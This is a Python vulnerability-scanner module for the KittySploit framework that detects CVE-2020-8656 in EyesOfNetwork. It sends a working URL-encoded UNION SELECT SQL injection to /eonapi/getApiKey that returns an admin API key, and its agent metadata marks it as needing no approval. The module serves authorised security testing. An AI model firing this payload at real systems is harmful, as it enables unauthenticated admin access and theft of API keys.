#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""EyesOfNetwork eonapi getApiKey SQL injection (CVE-2020-8656)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'EyesOfNetwork - eonapi getApiKey SQLi Detection (CVE-2020-8656)',
        'description': (
            'Detects CVE-2020-8656 by injecting into /eonapi/getApiKey username parameter '
            'and looking for EONAPI_KEY in a 200 JSON response.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2020', 'eyesofnetwork', 'sqli', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'admin_surface', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2020_9465_detect'],
            },
        },
        'references': [
            'https://github.com/h4knet/eonrce',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-8656',
        ],
        'cve': 'CVE-2020-8656',
    }

    base_path = OptString('', 'Optional EON base path', required=False)

    def _prefix(self) -> str:
        base = str(self.base_path or '').strip()
        if not base or base == '/':
            return ''
        if not base.startswith('/'):
            base = '/' + base
        return base.rstrip('/')

    def run(self):
        path = (
            f'{self._prefix()}/eonapi/getApiKey?&username=%27%20union%20select%201,'
            '%27admin%27,%271c85d47ff80b5ff2a4dd577e8e5f8e9d%27,0,0,1,1,8%20or%20%27'
            '&password=h4knet'
        )
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ''
        if re.search(r'"EONAPI_KEY"\s*:\s*"[a-f0-9]+"', body) and '200 OK' in body:
            self.set_info(
                severity='critical',
                reason='EyesOfNetwork getApiKey SQLi (CVE-2020-8656)',
                path=f'{self._prefix()}/eonapi/getApiKey',
            )
            return True
        return False
